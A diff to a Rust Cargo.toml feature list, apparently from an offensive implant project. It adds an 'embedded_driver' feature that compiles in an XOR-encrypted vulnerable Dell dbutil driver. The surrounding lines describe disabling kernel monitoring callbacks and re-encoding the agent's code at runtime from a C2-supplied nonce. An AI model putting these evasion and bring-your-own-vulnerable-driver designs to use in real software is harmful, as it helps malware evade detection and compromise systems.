@@ -202,6 +202,14 @@ evanesco = []
 # causes the callback to immediately return without executing any monitoring
 # logic.  Requires (and implies) `direct-syscalls`.  Windows-only.
 kernel-callback = ["direct-syscalls"]
+# Embed XOR-encrypted vulnerable driver bytes at compile time.  When enabled,
+# the ORCHESTRA_DRIVER_PATH environment variable MUST be set to the path of the
+# encrypted driver file.  If not set, compilation fails with a clear error.
+# Example:
+#   ORCHESTRA_DRIVER_PATH=resources/drivers/dbutil_2_3_xor_encrypted.bin \
+#       cargo build --features embedded_driver
+# When disabled (default), a minimal placeholder driver stub is included instead.
+embedded_driver = []
 # Self-re-encoding ("Metamorphic Lite"): periodically re-encode the agent's own
 # .text section at runtime using the code_transform pipeline with a fresh seed
 # derived from a C2-supplied nonce and the current timestamp.
